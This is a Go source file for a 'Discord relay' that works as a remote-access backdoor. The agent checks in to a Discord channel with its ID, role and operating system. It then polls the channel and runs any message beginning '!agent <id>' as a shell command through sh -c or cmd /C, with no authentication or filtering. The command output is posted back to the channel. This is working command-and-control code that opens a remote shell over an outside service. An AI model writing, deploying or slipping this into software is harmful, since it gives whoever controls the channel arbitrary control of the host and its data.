package relay

import (
	"context"
	"fmt"
	"log"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/bwmarrin/discordgo"
)

type DiscordRelay struct {
	Token     string
	ChannelID string
	AgentID   string
	AgentName string
	Role      string
	session   *discordgo.Session
}

func NewDiscordRelay(token, channelID, agentID, agentName, role string) *DiscordRelay {
	return &DiscordRelay{
		Token:     token,
		ChannelID: channelID,
		AgentID:   agentID,
		AgentName: agentName,
		Role:      role,
	}
}

func (d *DiscordRelay) Start(ctx context.Context) error {
	dg, err := discordgo.New("Bot " + d.Token)
	if err != nil {
		return err
	}

	d.session = dg

	// Signal online status
	name := d.AgentName
	if name == "" {
		name = d.AgentID
	}
	d.PostMessage(fmt.Sprintf("📡 [ ⟐ %s ] Initializing handshake: ID=%s ROLE=%s PLATFORM=%s VERSION=v1.5.1", name, d.AgentID, d.Role, runtime.GOOS))

	// Start polling loop
	go d.pollLoop(ctx)

	log.Printf("🔗 Discord Relay active on channel %s", d.ChannelID)
	return nil
}

func (d *DiscordRelay) PostMessage(content string) {
	if d.session == nil {
		return
	}
	_, err := d.session.ChannelMessageSend(d.ChannelID, content)
	if err != nil {
		log.Printf("⚠️ Discord post failed: %v", err)
	}
}

func (d *DiscordRelay) pollLoop(ctx context.Context) {
	ticker := time.NewTicker(15 * time.Second)
	defer ticker.Stop()

	var lastMessageID string

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			messages, err := d.session.ChannelMessages(d.ChannelID, 5, "", lastMessageID, "")
			if err != nil {
				log.Printf("⚠️ Discord poll failed: %v", err)
				continue
			}

			for i := len(messages) - 1; i >= 0; i-- {
				msg := messages[i]
				lastMessageID = msg.ID

				// Check for command prefix: !agent <AgentID> <Command> or !agent <AgentName> <Command>
				prefixID := fmt.Sprintf("!agent %s ", d.AgentID)
				prefixName := fmt.Sprintf("!agent %s ", d.AgentName)
				
				var cmdStr string
				if strings.HasPrefix(msg.Content, prefixID) {
					cmdStr = strings.TrimPrefix(msg.Content, prefixID)
				} else if d.AgentName != "" && strings.HasPrefix(msg.Content, prefixName) {
					cmdStr = strings.TrimPrefix(msg.Content, prefixName)
				}

				if cmdStr != "" {
					log.Printf("🛠️ Executing command: %s", cmdStr)
					d.executeAndPost(cmdStr)
				}
			}
		}
	}
}

func (d *DiscordRelay) executeAndPost(cmdStr string) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", cmdStr)
	} else {
		cmd = exec.Command("sh", "-c", cmdStr)
	}

	output, err := cmd.CombinedOutput()
	result := string(output)
	if err != nil {
		result = fmt.Sprintf("Error: %v\nOutput: %s", err, result)
	}

	if len(result) > 1900 {
		result = result[:1900] + "... (truncated)"
	}

	name := d.AgentName
	if name == "" {
		name = d.AgentID
	}
	d.PostMessage(fmt.Sprintf("⚙️ [ ⟐ %s ] Execution Result:\n```\n%s\n```", name, result))
}
